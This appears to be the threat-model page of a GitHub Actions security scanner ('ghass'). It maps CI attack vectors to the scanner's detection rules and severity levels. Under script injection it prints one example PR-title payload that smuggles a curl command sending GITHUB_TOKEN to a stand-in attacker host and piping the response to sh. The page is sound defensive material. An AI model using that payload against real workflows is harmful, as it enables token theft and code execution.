<div align="center">
  <img src="../RayStudio.png" alt="RayStudio Logo" width="120"/>
  <h1>Threat Model</h1>
</div>

## Attack Surface

GitHub Actions workflows represent a significant attack surface in software supply chains:

- Workflows run on every push, PR, issue comment or schedule
- Workflows have access to repository secrets, GITHUB_TOKEN and deployment environments
- Third-party actions execute arbitrary code with the same privileges as the workflow

## Threat Actors

| Actor | Goal | Capability |
|---|---|---|
| Malicious PR author | Execute code with write permissions | Control PR title, body, branch content |
| Compromised action upstream | Exfiltrate secrets, inject malicious code | Modify action code at mutable reference |
| Supply chain attacker | Persistent access via runner | Compromise self-hosted runner environment |
| Insider threat | Bypass required reviews | Modify workflow permissions or triggers |

## Mapped Attack Vectors

### 1. Script Injection (CWE-78)

**Vector:** Attacker crafts a PR title or issue body containing shell metacharacters.

**Example payload in PR title:**
```
Fix bug"; curl -s https://attacker.example/exfil?t=$GITHUB_TOKEN | sh #
```

When interpolated into `run: echo "${{ github.event.pull_request.title }}"`, the shell executes the injected command with full GITHUB_TOKEN permissions.

**Detection:** ghass checks all `run:` steps for direct context expression interpolation.

### 2. Pwn Request (CWE-913)

**Vector:** `pull_request_target` trigger with PR head checkout. The attacker forks the repo, adds malicious steps to workflow files in the PR, and the target repository's CI executes them with write permissions.

**Detection:** ghass detects `pull_request_target` combined with `actions/checkout` using a PR head ref.

### 3. Unpinned Action Supply Chain Attack (CWE-829)

**Vector:** Attacker compromises the GitHub account of a popular action maintainer and pushes malicious code to a mutable tag or branch. All workflows using that action without SHA pinning immediately execute the malicious payload.

**Detection:** ghass flags every `uses:` reference that is not a 40-character commit SHA.

### 4. Secret Exfiltration via Third-Party Action (CWE-522)

**Vector:** A popular CI action is compromised and its new version reads all environment variables and `with:` inputs, exfiltrating secrets to an attacker-controlled server.

**Detection:** ghass flags all `secrets.*` values passed to non-first-party actions.

### 5. Self-Hosted Runner Persistence (CWE-653)

**Vector:** An attacker exploits a script injection or supply chain vulnerability to gain code execution on a self-hosted runner. The runner persists between runs and may have access to internal network resources, credentials cached in home directories, or build artifacts from other repositories.

**Detection:** ghass flags all `runs-on: self-hosted` jobs.

## Severity Classification

| Finding Type | Default Severity | Escalation Conditions |
|---|---|---|
| Script Injection | Critical | Always critical |
| Pwn Request | Critical | Always critical |
| write-all Permissions | High | Always high |
| Contents Write | High | Critical if combined with PR trigger |
| Secret to Third-Party | High | Critical if action is unpinned |
| Unpinned Action (branch) | High | Critical if secrets are passed |
| Self-Hosted Runner | Medium | High if triggered by external PRs |
| Unpinned Action (tag) | Medium | Always medium |
| Secret in Env Var | Informational | Correct pattern when used properly |
